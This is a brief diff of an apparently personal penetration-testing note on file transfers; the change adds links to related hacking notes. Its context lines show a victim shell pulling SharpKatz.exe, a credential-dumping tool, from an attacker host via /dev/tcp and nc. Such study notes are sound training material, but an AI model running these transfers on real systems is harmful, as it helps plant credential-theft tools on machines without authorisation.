@@ -21,3 +21,9 @@ victim@target:~$ cat < /dev/tcp/192.168.0.200/8080 > SharpKatz.exe
 ```bash
 me@hanato:~$ nc -q 0 192.168.0.200 8080 < SharpKatz.exe
 ```
+
+
+## Related
+- [Nmap Cheatsheet](notes/hacking/nmap-cheatsheet.md)
+- [File Transfers](notes/hacking/htb-file-transfers.md)
+- [Hacking Hub](notes/hacking/hacking-hub.md)
